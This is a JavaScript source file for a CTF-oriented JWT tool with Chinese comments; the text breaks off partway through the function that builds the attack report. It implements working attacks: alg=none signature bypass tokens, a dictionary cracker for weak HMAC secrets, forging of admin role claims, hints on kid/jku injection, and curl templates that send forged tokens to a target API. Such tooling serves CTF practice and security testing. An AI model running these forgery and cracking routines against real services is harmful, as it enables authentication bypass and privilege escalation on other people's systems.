/**
 * `ctf_jwt` — JWT 解剖、HMAC 校验、伪造与弱密钥攻击。
 *
 * 设计取向：所有换算与判定都在本地完成，不发起任何网络请求；base64url 编解码、
 * HMAC 比对（crypto.timingSafeEqual）与弱口令攻击是正确性核心，因此都抽成具名
 * 纯函数并配往返/边界测试。报告层只负责把结构翻译成中文 Markdown，不参与判定，
 * 这样测试可以绕过报告直接断言算法结果。
 *
 * 注意：本工具只回答「本地能推出什么」，例如弱密钥是否命中、alg=none 变体长什么
 * 样；服务端是否真的接受，仍然需要解题者自己发请求验证。
 */
import { createHmac, timingSafeEqual } from 'node:crypto'
import {
  bytesToHex,
  decodeUtf8,
  escapeNonPrintable,
  formatRows,
  preview,
  textOutput,
} from './util.js'

/** 工具支持的 action（与 parameters 里的 enum 保持一致）。 */
const JWT_ACTIONS = ['decode', 'verify', 'sign', 'attack']
/** 支持的算法：HS* 走 HMAC，none 是无签名绕过手法。 */
const JWT_ALGORITHMS = ['HS256', 'HS384', 'HS512', 'none']
/** 算法 → Node crypto 的摘要名。 */
const HMAC_HASHES = Object.freeze({ HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' })
/** 关键词 → 提示语，避免报告里出现「似乎/可能」之外的空话。 */
const JWT_DESCRIPTION =
  'Dissect, verify and forge HS256/384/512 JWTs: decode header and payload, check exp/nbf timing, verify a secret, sign a new token, or attack weak secrets and the alg=none confusion.'

/**
 * 内置弱密钥字典：CTF 与真实项目里最常见的默认值、演示值、中文口令。
 * 只放「猜中即有价值」的候选；额外候选通过 wordlist 参数追加。
 */
const WEAK_JWT_SECRETS = Object.freeze([
  'secret', 'secretkey', 'secret_key', 'secret-key', 'mysecret', 'supersecret', 'super_secret',
  'jwt', 'jwtsecret', 'jwt_secret', 'jwt-secret', 'jwttoken', 'jsonwebtoken',
  'password', 'Password', 'password1', 'Password1', 'passwd', 'pass', 'p@ssw0rd', 'P@ssw0rd',
  '123456', '12345678', '123456789', '1234567890', '111111', '000000', '666666', '888888', '88888888',
  'admin', 'admin123', 'admin@123', 'root', 'toor', 'changeme', 'change_me', 'letmein',
  'key', 'apikey', 'api_key', 'privatekey', 'private_key', 'signingkey', 'signing_key', 'hmac', 'hmac_secret',
  'sha256', 'sha1', 'test', 'test123', 'dev', 'development', 'prod', 'production', 'staging', 'debug',
  'default', 'example', 'sample', 'demo', 'guest', 'user',
  'flag', 'ctf', 'ctf2024', 'ctf2025', 'flag123', 's3cr3t', 's3cret', 'your-256-bit-secret',
  'qwerty', 'abc123', 'iloveyou', 'welcome', 'monkey', 'dragon', 'master', 'trustno1', 'hunter2',
  'hello', 'world', 'foo', 'bar', 'baz', 'none', 'null', 'undefined', 'empty', 'token',
  '密钥', '密码', '测试', '管理员',
])

/** 身份/权限类 claim 名：这些字段是 JWT 越权里最先被篡改的目标。 */
const IDENTITY_FIELD = /^(?:role|roles|admin|is_?admin|superuser|user|username|user_?name|sub|uid|user_?id|gid|group|groups|scope|scopes|permission|permissions|authority|authorities|type|user_?type|tier|plan|debug|feature|features)$/i
/** 字段名像密钥/口令：如果服务端把它当 HMAC 密钥，token 就能被离线伪造。 */
const SECRET_FIELD = /(?:secret|passw|passwd|pwd|api_?key|apikey|hmac|signing|salt|private|credential|token)/i
/** 值里出现 flag/ctf/key{ 形态：很可能直接就是答案。 */
const FLAG_VALUE = /(?:flag|ctf|key)\s*[\{\(\[=:]/i

/** 方案内的动作归一化：缺省回落到 decode，非法值返回 null 由 execute 报错。 */
function normalizeAction(value) {
  if (value === undefined || value === null || value === '') return 'decode'
  return typeof value === 'string' && JWT_ACTIONS.includes(value) ? value : null
}

/** 算法归一化：非法值回落到 HS256（只影响「期望算法」提示，不覆盖 header.alg）。 */
function normalizeAlgorithm(value) {
  return typeof value === 'string' && JWT_ALGORITHMS.includes(value) ? value : 'HS256'
}

// ---------------------------------------------------------------------------
// base64url
// ---------------------------------------------------------------------------

/**
 * base64url 编码。接受字符串（按 UTF-8）或字节数组，输出不带 `=` 填充的
 * RFC 4648 §5 字符串（JWT 的 header/payload/signature 都是这种形式）。
 * @param {string | Uint8Array} input
 * @returns {string}
 */
export function base64UrlEncode(input) {
  let buffer
  if (typeof input === 'string') buffer = Buffer.from(input, 'utf8')
  else if (input instanceof Uint8Array) buffer = Buffer.from(input)
  else throw new Error('base64url 编码只接受字符串或字节数组')
  return buffer.toString('base64url')
}

/**
 * base64url 解码。刻意允许结尾有 `=` 填充（有些工具会保留），但拒绝非法字符和
 * `length % 4 === 1` 这种不可能还原的长度，避免把坏 token 静默解成乱码。
 * @param {string} input
 * @returns {Uint8Array}
 */
export function base64UrlDecode(input) {
  if (typeof input !== 'string') throw new Error('base64url 解码只接受字符串')
  const cleaned = input.trim().replace(/=+$/u, '')
  if (cleaned.length === 0) return new Uint8Array(0)
  if (!/^[A-Za-z0-9_-]+$/u.test(cleaned)) {
    throw new Error('不是合法的 base64url 字符串（只允许 A-Z a-z 0-9 - _）')
  }
  if (cleaned.length % 4 === 1) {
    throw new Error('base64url 字符串长度非法（mod 4 余 1，无法还原）')
  }
  const normalized = cleaned.replace(/-/gu, '+').replace(/_/gu, '/')
  return new Uint8Array(Buffer.from(normalized, 'base64'))
}

// ---------------------------------------------------------------------------
// 结构解析
// ---------------------------------------------------------------------------

/**
 * 把 token 拆成 header / payload / signature 三段并解析 JSON。
 * 失败时返回 `{ ok: false, error }` 而不是抛错，便于 execute 统一转成中文报告。
 * @param {string} token
 */
export function decodeJwt(token) {
  const raw = typeof token === 'string' ? token.trim() : ''
  if (raw.length === 0) return { ok: false, error: 'token 为空：至少需要 header.payload 两段' }
  const segments = raw.split('.')
  if (segments.length !== 3 && segments.length !== 2) {
    return { ok: false, error: `JWT 应以 . 分成 3 段（或 2 段的 unsecured 形式），当前 ${segments.length} 段` }
  }
  let headerBytes
  let payloadBytes
  try {
    headerBytes = base64UrlDecode(segments[0])
    payloadBytes = base64UrlDecode(segments[1])
  } catch (error) {
    return { ok: false, error: `header/payload 不是合法 base64url：${error.message}` }
  }
  let header
  let payload
  try {
    header = JSON.parse(decodeUtf8(headerBytes))
  } catch (error) {
    return { ok: false, error: `header 不是合法 JSON：${error.message}` }
  }
  try {
    payload = JSON.parse(decodeUtf8(payloadBytes))
  } catch (error) {
    return { ok: false, error: `payload 不是合法 JSON：${error.message}` }
  }
  if (header === null || typeof header !== 'object' || Array.isArray(header)) {
    return { ok: false, error: 'header 解码后不是 JSON 对象' }
  }
  if (payload === null || typeof payload !== 'object' || Array.isArray(payload)) {
    return { ok: false, error: 'payload 解码后不是 JSON 对象' }
  }
  const signatureSegment = segments.length === 3 ? segments[2] : ''
  let signatureBytes = new Uint8Array(0)
  if (signatureSegment.length > 0) {
    try {
      signatureBytes = base64UrlDecode(signatureSegment)
    } catch (error) {
      return { ok: false, error: `signature 不是合法 base64url：${error.message}` }
    }
  }
  const notes = []
  if (segments.length === 2) notes.push('只有两段：按 unsecured JWT（alg=none、无签名）处理。')
  if (typeof header.alg === 'string' && header.alg.toLowerCase() === 'none') {
    notes.push('header.alg 为 none：这是无签名 token，服务端是否接受是关键。')
  }
  return {
    ok: true,
    segments,
    header,
    payload,
    headerBytes,
    payloadBytes,
    headerSegment: segments[0],
    payloadSegment: segments[1],
    signatureSegment,
    signatureBytes,
    signingInput: `${segments[0]}.${segments[1]}`,
    algorithm: typeof header.alg === 'string' ? header.alg : '',
    notes,
  }
}

// ---------------------------------------------------------------------------
// 时间字段
// ---------------------------------------------------------------------------

/** 把秒/毫秒级 epoch 转成清晰的 UTC 时间；绝对值的量级用来判断单位。 */
export function epochToIsoString(value) {
  const numeric = Number(value)
  if (!Number.isFinite(numeric)) return '非法时间戳'
  const asMillis = Math.abs(numeric) > 1e11
  const date = new Date(asMillis ? numeric : numeric * 1000)
  if (Number.isNaN(date.getTime())) return '非法时间戳'
  const iso = date.toISOString().replace('.000Z', 'Z')
  return asMillis ? `${iso}（按毫秒时间戳解读）` : iso
}

/** 把 exp/nbf/iat 统一成秒级 epoch；毫秒级时间戳自动除以 1000 再比较。 */
function normalizeEpochSeconds(value) {
  const numeric = Number(value)
  if (!Number.isFinite(numeric)) return null
  return Math.abs(numeric) > 1e11 ? Math.floor(numeric / 1000) : Math.floor(numeric)
}

/**
 * 分析 payload 里的 iat/nbf/exp：给人可读时间，并判断过期/未生效。
 * 判定以 `nowSeconds` 为基准，默认取当前时间；测试里可以注入固定时间。
 * @param {Record<string, unknown>} payload
 * @param {number} [nowSeconds]
 */
export function describeJwtTiming(payload, nowSeconds) {
  const now = Number.isFinite(nowSeconds) ? Math.floor(nowSeconds) : Math.floor(Date.now() / 1000)
  const result = {
    now,
    iat: null,
    nbf: null,
    exp: null,
    expired: null,
    notYetValid: null,
    expiresInSeconds: null,
    warnings: [],
  }
  const body = payload !== null && typeof payload === 'object' ? payload : {}
  const hasKey = (key) => Object.prototype.hasOwnProperty.call(body, key)
  for (const key of ['iat', 'nbf', 'exp']) {
    if (!hasKey(key)) continue
    const raw = body[key]
    const seconds = normalizeEpochSeconds(raw)
    const entry = {
      key,
      raw,
      iso: epochToIsoString(raw),
      status: '',
    }
    if (seconds === null) {
      entry.status = '值不是数字，无法与当前时间比较'
      result.warnings.push(`${key} 不是数字时间戳，很多实现会直接忽略这个校验。`)
      result[key] = entry
      continue
    }
    if (key === 'exp') {
      result.exp = entry
      if (now >= seconds) {
        entry.status = `已过期（过期 ${now - seconds} 秒）`
        result.expired = true
        result.warnings.push('token 已过期；如果服务端仍返回 200，说明它没有校验 exp。')
      } else {
        const left = seconds - now
        entry.status = `未过期（剩余 ${left} 秒）`
        result.expired = false
        result.expiresInSeconds = left
      }
    } else if (key === 'nbf') {
      result.nbf = entry
      if (now < seconds) {
        entry.status = `尚未生效（还差 ${seconds - now} 秒）`
        result.notYetValid = true
        result.warnings.push('token 尚未到 nbf；服务端若接受，说明没有校验生效时间。')
      } else {
        entry.status = '已生效'
        result.notYetValid = false
      }
    } else {
      result.iat = entry
      if (seconds > now) {
        entry.status = `签发时间在未来 ${seconds - now} 秒（时钟不齐或伪造）`
        result.warnings.push('iat 在未来：可能是服务端时钟漂移，也可能是手工伪造的 token。')
      } else {
        entry.status = `签发于 ${now - seconds} 秒前`
      }
    }
  }
  if (result.exp === null && hasKey('exp') === false) {
    result.warnings.push('payload 没有 exp：很多实现会把它当成永不过期；是否有校验要看服务端。')
  }
  return result
}

// ---------------------------------------------------------------------------
// 可疑字段 / 攻击面
// ---------------------------------------------------------------------------

/** 判断一个 claim 值是否像「已提权」。 */
function looksPrivileged(value) {
  if (value === true) return true
  if (value === 1) return true
  if (typeof value === 'string') {
    return /^(?:true|admin|administrator|root|superuser|super_admin|yes|1)$/i.test(value.trim())
  }
  return false
}

/**
 * 找出 header/payload 里值得攻击的字段：身份/权限 claim、像密钥的字段、
 * kid/jku/x5u 这类 header 注入点，以及明文里的 flag 形态字符串。
 * @param {Record<string, unknown>} header
 * @param {Record<string, unknown>} payload
 * @returns {Array<{location: string, field: string, value: string, hint: string}>}
 */
export function findSuspiciousClaims(header, payload) {
  const found = []
  const add = (location, field, value, hint) => {
    const text = typeof value === 'string' ? value : JSON.stringify(value)
    found.push({ location, field, value: preview(text ?? '', 60), hint })
  }
  const headerBody = header !== null && typeof header === 'object' ? header : {}
  const payloadBody = payload !== null && typeof payload === 'object' ? payload : {}

  for (const [field, value] of Object.entries(headerBody)) {
    if (field === 'kid') {
      add('header', field, value, 'kid 是密钥选择器：常见 kid 注入（路径穿越 / SQL / 指向攻击者可控密钥）')
    } else if (field === 'jku' || field === 'x5u') {
      add('header', field, value, 'key URL：若服务端去拉取，可指向攻击者可控的 JWKS（SSRF / 密钥注入）')
    } else if (field === 'jwk') {
      add('header', field, value, '内嵌公钥：注意服务端是否错误地用它验证 HS* 签名')
    } else if (field === 'alg' && typeof value === 'string' && value.toLowerCase() === 'none') {
      add('header', field, value, 'alg=none：服务端若接受，可免签名伪造任意 payload')
    }
  }

  for (const [field, value] of Object.entries(payloadBody)) {
    if (field === 'kid') {
      add('payload', field, value, '出现在 payload 的 kid 也可能被服务端读取')
      continue
    }
    if (IDENTITY_FIELD.test(field)) {
      const privileged = looksPrivileged(value)
      add('payload', field, value, privileged
        ? '身份/权限字段且值偏高权限：若签名不被校验，改这里即可提权'
        : '身份/权限字段：留意签名是否真的被校验')
    } else if (SECRET_FIELD.test(field)) {
      add('payload', field, value, '字段名像密钥/口令：若服务端信任它，可能直接用于签名或鉴权')
    }
    if (typeof value === 'string' && FLAG_VALUE.test(value)) {
      add('payload', field, value, '值里出现 flag/ctf/key 形态字符串，可能直接就是答案')
    }
  }
  return found
}

// ---------------------------------------------------------------------------
// HMAC 校验 / 伪造
// ---------------------------------------------------------------------------

/** 对 signingInput 做 HMAC，返回原始签名字节。 */
function hmacSign(signingInput, secret, algorithm) {
  const hash = HMAC_HASHES[algorithm]
  if (hash === undefined) throw new Error(`不支持 HMAC 算法：${algorithm}`)
  return new Uint8Array(
    createHmac(hash, Buffer.from(String(secret), 'utf8')).update(signingInput).digest(),
  )
}

/**
 * 用 secret 校验 token 的 HMAC 签名。
 * 比对走 crypto.timingSafeEqual（长度先单独比较，因为 timingSafeEqual 对不等长直接抛错）。
 * @param {string} token
 * @param {string} secret
 * @param {string} [requestedAlgorithm] 调用方期望的算法，仅用于「与实际 header.alg 不一致」告警
 */
export function verifyJwtHmac(token, secret, requestedAlgorithm = '') {
  const decoded = decodeJwt(token)
  if (!decoded.ok) return { ok: false, matched: false, error: decoded.error, decoded }
  const algorithm = decoded.algorithm
  const result = {
    ok: true,
    matched: false,
    algorithm,
    requestedAlgorithm: typeof requestedAlgorithm === 'string' ? requestedAlgorithm : '',
    expectedSignature: '',
    actualSignature: decoded.signatureSegment,
    algorithmMismatch: typeof requestedAlgorithm === 'string'
      && requestedAlgorithm.length > 0
      && requestedAlgorithm !== algorithm,
    warnings: [],
    decoded,
  }
  if (algorithm === 'none') {
    result.warnings.push('token 的 header.alg 为 none：没有签名可比对，这本身就是一条绕过线索。')
    return result
  }
  if (HMAC_HASHES[algorithm] === undefined) {
    result.ok = false
    result.error = `不支持按 ${algorithm || '(空)'} 做 HMAC 校验，只支持 HS256 / HS384 / HS512`
    return result
  }
  if (typeof secret !== 'string') {
    result.ok = false
    result.error = 'verify 需要 secret 字符串（空字符串也会按空密钥尝试）'
    return result
  }
  const expected = hmacSign(decoded.signingInput, secret, algorithm)
  result.expectedSignature = base64UrlEncode(expected)
  const actual = decoded.signatureBytes
  if (expected.length !== actual.length) {
    result.warnings.push(`签名长度不同（期望 ${expected.length} 字节，实际 ${actual.length} 字节），直接判定不匹配。`)
    if (result.algorithmMismatch) {
      result.warnings.push(`请求的 algorithm=${requestedAlgorithm} 与 header.alg=${algorithm} 不一致；校验以 header.alg 为准，注意服务端是否信任 header.alg。`)
    }
    return result
  }
  result.matched = timingSafeEqual(Buffer.from(expected), Buffer.from(actual))
  if (!result.matched) {
    result.warnings.push('HMAC 不匹配：密钥错误、签名段被改动，或算法不同。')
  }
  if (result.algorithmMismatch) {
    result.warnings.push(`请求的 algorithm=${requestedAlgorithm} 与 header.alg=${algorithm} 不一致；校验以 header.alg 为准，注意服务端是否信任 header.alg。`)
  }
  return result
}

/**
 * 用 payload(JSON 字符串) + secret + algorithm 伪造一个新 token。
 * alg=none 分支返回无签名 token：三段空签名（`h.p.`）与去掉尾部点的两段形式。
 * @param {{payload: string, secret?: string, algorithm?: string}} options
 */
export function signJwt(options = {}) {
  const algorithm = normalizeAlgorithm(options.algorithm)
  const payloadText = options.payload
  if (typeof payloadText !== 'string' || payloadText.trim().length === 0) {
    throw new Error('sign 需要 payload：一个 JSON 字符串，例如 {"sub":"admin","role":"admin"}')
  }
  let parsed
  try {
    parsed = JSON.parse(payloadText)
  } catch (error) {
    throw new Error(`payload 不是合法 JSON：${error.message}`)
  }
  if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
    throw new Error('payload 顶层必须是 JSON 对象')
  }
  const header = { alg: algorithm, typ: 'JWT' }
  const headerSegment = base64UrlEncode(JSON.stringify(header))
  const payloadSegment = base64UrlEncode(JSON.stringify(parsed))
  const signingInput = `${headerSegment}.${payloadSegment}`
  if (algorithm === 'none') {
    return {
      algorithm,
      header,
      payload: parsed,
      headerSegment,
      payloadSegment,
      signingInput,
      signatureSegment: '',
      signatureBytes: new Uint8Array(0),
      token: `${signingInput}.`,
      tokenWithoutTrailingDot: signingInput,
      notes: [
        'alg=none 表示「不签名」：RFC 7519 允许空签名，形如 header.payload.。',
        '很多实现会接受去掉尾部点的两段形式 header.payload；两者都可以试。',
        '这是经典签名绕过手法，前提是服务端没有强制算法白名单。',
      ],
    }
  }
  if (typeof options.secret !== 'string') {
    throw new Error('sign 需要 secret 字符串（HS256/HS384/HS512）')
  }
  const signatureBytes = hmacSign(signingInput, options.secret, algorithm)
  const signatureSegment = base64UrlEncode(signatureBytes)
  return {
    algorithm,
    header,
    payload: parsed,
    headerSegment,
    payloadSegment,
    signingInput,
    signatureSegment,
    signatureBytes,
    token: `${signingInput}.${signatureSegment}`,
    tokenWithoutTrailingDot: signingInput,
    notes: [],
  }
}

// ---------------------------------------------------------------------------
// 弱密钥攻击
// ---------------------------------------------------------------------------

/**
 * 合并内置字典与用户 wordlist，去重并保持顺序；非法项静默跳过（模型常传数字）。
 * @param {unknown} extraCandidates
 * @returns {string[]}
 */
export function buildWeakSecretList(extraCandidates = []) {
  const seen = new Set()
  const list = []
  const push = (value) => {
    if (typeof value !== 'string' || value.length === 0) return
    if (seen.has(value)) return
    seen.add(value)
    list.push(value)
  }
  for (const item of WEAK_JWT_SECRETS) push(item)
  for (const item of Array.isArray(extraCandidates) ? extraCandidates : []) push(item)
  return list
}

/**
 * 逐个尝试候选密钥，命中即返回。只做本地 HMAC 计算，不联网、不猜测服务端行为。
 * @param {string} token
 * @param {unknown} [extraCandidates] 追加候选（wordlist）
 */
export function crackJwtSecret(token, extraCandidates = []) {
  const decoded = decodeJwt(token)
  if (!decoded.ok) return { ok: false, hit: null, error: decoded.error, decoded }
  const algorithm = decoded.algorithm
  if (algorithm === 'none') {
    return {
      ok: true,
      hit: null,
      algorithm,
      attempted: 0,
      total: 0,
      note: 'header.alg 为 none：无需密钥即可伪造；真正的问题在服务端是否接受。',
      decoded,
    }
  }
  if (HMAC_HASHES[algorithm] === undefined) {
    return {
      ok: false,
      hit: null,
      algorithm,
      attempted: 0,
      total: 0,
      error: `只支持攻击 HS256 / HS384 / HS512，当前 header.alg=${algorithm || '(空)'}`,
      decoded,
    }
  }
  const actual = decoded.signatureBytes
  if (actual.length === 0) {
    return {
      ok: true,
      hit: null,
      algorithm,
      attempted: 0,
      total: 0,
      note: 'token 没有签名段，无需猜密钥；可直接尝试 alg=none 变体。',
      decoded,
    }
  }
  const candidates = buildWeakSecretList(extraCandidates).slice(0, 20000)
  let attempted = 0
  for (const candidate of candidates) {
    attempted += 1
    const expected = hmacSign(decoded.signingInput, candidate, algorithm)
    if (expected.length !== actual.length) continue
    if (timingSafeEqual(Buffer.from(expected), Buffer.from(actual))) {
      return {
        ok: true,
        hit: { secret: candidate, algorithm },
        attempted,
        total: candidates.length,
        decoded,
      }
    }
  }
  return { ok: true, hit: null, attempted, total: candidates.length, decoded }
}

/**
 * 生成 alg=none 免签变体：保留 payload，替换 header。
 * @param {string} token
 */
export function buildAlgNoneTokens(token) {
  const decoded = decodeJwt(token)
  if (!decoded.ok) throw new Error(decoded.error)
  const variants = []
  const push = (label, header) => {
    const headerSegment = base64UrlEncode(JSON.stringify(header))
    const signingInput = `${headerSegment}.${decoded.payloadSegment}`
    variants.push({
      label,
      header,
      headerSegment,
      token: `${signingInput}.`,
      tokenWithoutTrailingDot: signingInput,
    })
  }
  push('alg=none（typ=JWT，三段空签名）', { alg: 'none', typ: 'JWT' })
  const preserved = { ...decoded.header, alg: 'none' }
  if (JSON.stringify(preserved) !== JSON.stringify({ alg: 'none', typ: 'JWT' })) {
    push('alg=none（保留原 header 其余字段）', preserved)
  }
  return { decoded, variants }
}

// ---------------------------------------------------------------------------
// 报告
// ---------------------------------------------------------------------------

/** 统一的错误报告：保证 execute 永远返回可读文本而不是异常。 */
function jwtErrorReport(message) {
  return [
    '# ctf_jwt · 出错',
    '',
    '## 原因',
    '',
    message,
    '',
    '## 下一步',
    '',
    '- 检查 token 是否是 `header.payload.signature` 的三段 base64url 形式。',
    '- decode 只需要 `token`；verify 需要 `token` + `secret`；sign 需要 `payload`（JSON 字符串）。',
    '- attack 需要 `token`，`wordlist` 可选（数组，元素是追加的候选密钥）。',
  ].join('\n')
}

/** 时间字段表格。 */
function renderTimingTable(timing) {
  const entries = [timing.iat, timing.nbf, timing.exp].filter((entry) => entry !== null)
  if (entries.length === 0) return '（payload 中没有 iat / nbf / exp）'
  return formatRows(
    entries.map((entry) => [entry.key, String(entry.raw), entry.iso, entry.status]),
    ['字段', '原始值', '可读时间(UTC)', '状态'],
  )
}

/** 签名段摘要：hex 太长时截断，避免报告被一行撑爆。 */
function describeSignature(bytes) {
  if (bytes.length === 0) return '（空）'
  const hex = bytesToHex(bytes)
  const shown = hex.length > 64 ? `${hex.slice(0, 64)}…` : hex
  return `${bytes.length} 字节 · ${shown}`
}

/** 解析报告。 */
function renderDecodeReport(token) {
  const decoded = decodeJwt(token)
  if (!decoded.ok) return jwtErrorReport(`解析失败：${decoded.error}`)
  const timing = describeJwtTiming(decoded.payload)
  const suspicious = findSuspiciousClaims(decoded.header, decoded.payload)
  const lines = []
  lines.push('# ctf_jwt · 解析')
  lines.push('')
  lines.push(`- 段数：${decoded.segments.length}${decoded.segments.length === 2 ? '（unsecured：header.payload）' : ''}`)
  lines.push(`- header.alg：${decoded.algorithm || '(缺失)'}${decoded.algorithm === 'none' ? '（无签名算法）' : ''}`)
  lines.push(`- 签名：${decoded.signatureSegment.length > 0 ? `${decoded.signatureBytes.length} 字节` : '空（可直接尝试 alg=none 绕过）'}`)
  for (const note of decoded.notes) lines.push(`- 提示：${note}`)
  lines.push('')
  lines.push('## Header')
  lines.push('```json')
  lines.push(JSON.stringify(decoded.header, null, 2))
  lines.push('```')
  lines.push('')
  lines.push('## Payload')
  lines.push('```json')
  lines.push(JSON.stringify(decoded.payload, null, 2))
  lines.push('```')
  lines.push('')
  lines.push('## 时间字段')
  lines.push(renderTimingTable(timing))
  for (const warning of timing.warnings) lines.push(`- ⚠️ ${warning}`)
  lines.push('')
  lines.push('## 可疑字段与攻击面')
  if (suspicious.length === 0) {
    lines.push('- 没有发现明显的角色/密钥字段；继续看 verify 与 attack 的结果。')
  } else {
    lines.push(formatRows(
      suspicious.map((item) => [item.location, item.field, item.value, item.hint]),
      ['位置', '字段', '值预览', '提示'],
    ))
  }
  lines.push('')
  lines.push('## 签名段')
  lines.push(formatRows([
    ['算法', decoded.algorithm || '(缺失)'],
    ['签名数据', describeSignature(decoded.signatureBytes)],
    ['可读转义', escapeNonPrintable(decoded.signatureBytes, 64)],
    ['待尝试攻击', decoded.algorithm === 'none' ? 'alg=none 免签伪造' : '弱密钥字典 / alg=none 混淆'],
  ], ['项目', '值']))
  lines.push('')
  lines.push('## 用法示例')
  lines.push('```bash')
  lines.push('# 用原 token 访问受保护接口')
  lines.push(`curl -s -H "Authorization: Bearer ${token}" http://target/api/me`)
  lines.push('')
  lines.push('# 用正确密钥校验（ctf_jwt 的 verify）')
  lines.push(`# action=verify token=${token.slice(0, 24)}… secret=<猜测的密钥>`)
  lines.push('```')
  lines.push('')
  lines.push('## 下一步')
  lines.push('- 用 `action="verify"` + `secret` 确认密钥；用 `action="attack"` 跑内置弱字典。')
  lines.push('- header 里出现 `kid`/`jku`/`x5u` 时，留意密钥注入与 SSRF。')
  lines.push('- `alg` 为 none 或服务端信任 header.alg 时，用 `attack` 生成的免签 token 试提权。')
  return lines.join('\n')
}

/** 校验报告。 */
function renderVerifyReport(token, secret, requestedAlgorithm) {
  const result = verifyJwtHmac(token, secret, requestedAlgorithm)
  if (!result.ok) return jwtErrorReport(`校验失败：${result.error}`)
  const timing = describeJwtTiming(result.decoded.payload)
  const lines = []
  lines.push('# ctf_jwt · HMAC 校验')
  lines.push('')
  lines.push('## 结论')
  if (result.algorithm === 'none') {
    lines.push('- token 声明 `alg=none`，没有签名可比对；这本身就是一条绕过线索。')
  } else if (result.matched) {
    lines.push(`- ✅ 匹配：secret 正确（算法 ${result.algorithm}）。`)
  } else {
    lines.push('- ❌ 不匹配：secret 错误、算法不同，或签名段被改动过。')
  }
  lines.push('')
  lines.push('## 算法比对')
  lines.push(formatRows([
    ['header.alg', result.algorithm || '(缺失)'],
    ['请求校验的 algorithm', result.requestedAlgorithm || '(未指定)'],
    ['是否一致', result.requestedAlgorithm === ''
      ? '—（未显式指定，按 header.alg 校验）'
      : (result.algorithmMismatch ? '❌ 不一致' : '✅ 一致')],
  ], ['项目', '值']))
  if (result.algorithmMismatch) {
    lines.push(`- ⚠️ 请求的 algorithm=${requestedAlgorithm} 与 header.alg=${result.algorithm} 不一致：校验按 header.alg 执行；若服务端也信任 header.alg，就有算法混淆空间。`)
  }
  lines.push('')
  lines.push('## 签名对比')
  lines.push(formatRows([
    ['期望签名(base64url)', result.expectedSignature || '(不适用)'],
    ['实际签名(base64url)', result.actualSignature || '(空)'],
    ['期望签名(hex)', result.expectedSignature ? bytesToHex(base64UrlDecode(result.expectedSignature)) : '(不适用)'],
    ['实际签名(hex)', result.decoded.signatureBytes.length > 0 ? bytesToHex(result.decoded.signatureBytes) : '(空)'],
  ], ['项目', '值']))
  for (const warning of result.warnings) lines.push(`- ⚠️ ${warning}`)
  lines.push('')
  lines.push('## 时间校验')
  lines.push(renderTimingTable(timing))
  for (const warning of timing.warnings) lines.push(`- ⚠️ ${warning}`)
  lines.push('')
  lines.push('## 用法示例')
  lines.push('```bash')
  lines.push(`curl -s -H "Authorization: Bearer ${token}" http://target/api/me`)
  lines.push('```')
  lines.push('')
  lines.push('## 下一步')
  lines.push('- 校验通过后，改 payload 重新签名，观察服务端是否信任你写入的角色字段。')
  lines.push('- 校验不通过时先跑 `action="attack"`；弱密钥命中后即可离线伪造任意 payload。')
  return lines.join('\n')
}

/** 伪造报告。 */
function renderSignReport(payload, secret, algorithm) {
  const signed = signJwt({ payload, secret, algorithm })
  const lines = []
  lines.push('# ctf_jwt · 伪造 token')
  lines.push('')
  lines.push('## Token')
  lines.push('```text')
  lines.push(signed.token)
  lines.push('```')
  lines.push('')
  if (signed.algorithm === 'none') {
    lines.push('## alg=none 无签名变体')
    lines.push(formatRows([
      ['三段空签名', signed.token],
      ['两段（去掉尾部点）', signed.tokenWithoutTrailingDot],
    ], ['形式', 'token']))
    for (const note of signed.notes) lines.push(`- ${note}`)
    lines.push('')
  }
  lines.push('## 分段')
  lines.push(formatRows([
    ['header', signed.headerSegment, String(signed.headerSegment.length)],
    ['payload', signed.payloadSegment, String(signed.payloadSegment.length)],
    ['signature', signed.signatureSegment || '(空)', String(signed.signatureSegment.length)],
  ], ['段', '内容(base64url)', '长度']))
  lines.push('')
  lines.push('## 用法示例')
  lines.push('```bash')
  lines.push(`TOKEN='${signed.token}'`)
  lines.push('curl -s -H "Authorization: Bearer $TOKEN" http://target/api/me')
  lines.push('```')
  lines.push('')
  lines.push('## 下一步')
  lines.push('- 把 payload 里的角色/用户字段改成目标权限再签一次，观察服务端是否只看 payload。')
  lines.push('- 签名算法与服务端一致才会被接受；`alg=none` 只在服务端没有算法白名单时有效。')
  return lines.join('\n')
}

/** 弱密钥攻击报告。 */
function renderAttackReport(token, wordlist) {
  const startedAt = Date.now()
  const result = crackJwtSecret(token, wordlist)
  const elapsedMs = Date.now() - startedAt
  if (!result.ok) return jwtErrorReport(`攻击失败：${result.error}`)
  const lines = []
  lines.push('# ctf_jwt · 弱密钥攻击')
  lines.push('')
  lines.push('## 结果')
  if (result.hit) {
    lines.push(`- ✅ 命中弱密钥：\`${result.hit.secret}\`（算法 ${result.hit.algorithm}）`)
    lines.push(`- 命中位置：第 ${result.attempted} / ${result.total} 个候选。`)
  } else if (result.note) {
    lines.push(`- ${result.note}`)
  } else {
    lines.push(`- ❌ 内置字典 + wordlist 共 ${result.total} 条候选全部未命中。`)
    lines.push('- 这不代表 token 安全：密钥可能是长随机串，也可能服务端还有别的漏洞（算法混淆、kid 注入、无签名校验）。')
  }
  lines.push('')
  lines.push('## 字典尝试')
  lines.push(formatRows([
    ['候选总数', String(result.total)],
    ['实际尝试', String(result.attempted)],
    ['耗时', `${elapsedMs} ms`],
    ['HMAC 算法', result.algorithm || '(未知)'],
  ], ['项目', '值']))
  lines.push('')
  lines.push('## alg=none 伪造')
  try {
    const none = buildAlgNoneTokens(token)
    lines.push(formatRows(
      none.variants.map((variant) => [variant.label, variant.token]),
      ['变体', 'token'],
    ))
    if (none.variants.length > 0) {
      lines.push('')
      lines.push('```text')
      lines.push(none.variants[0].token)
      lines.push('```')
    }
  } catch (error) {
    lines.push(`- 无法生成 alg=none 变体：${error.message}`)
  }
  lines.push('')
  lines.push('## 服务端接受情形检查（仅本地推断，不联网）')
  lines.push('- 是否强制算法白名单：拒绝 `none` 与非预期 alg 才算安全。')
  lines.push('- 是否真的校验签名：改 payload 后仍返回 200/正常数据，说明没校验。')
  lines.push('- 是否信任 header：`kid` 路径穿越 / SQL、`jku`/`x5u` 指向攻击者密钥都是常见注入点。')
  lines.push('- 是否校验 exp/nbf：已过期 token 仍可用说明时间校验缺失。')
  lines.push('')
  lines.push('## 用法示例')
  const forged = result.hit !== null
    ? (() => {
        try {
          const signed = signJwt({ payload: JSON.stringify({ sub: 'admin', role: 'admin' }), secret: result.hit.secret, algorithm: result.hit.algorithm })
          return signed.token
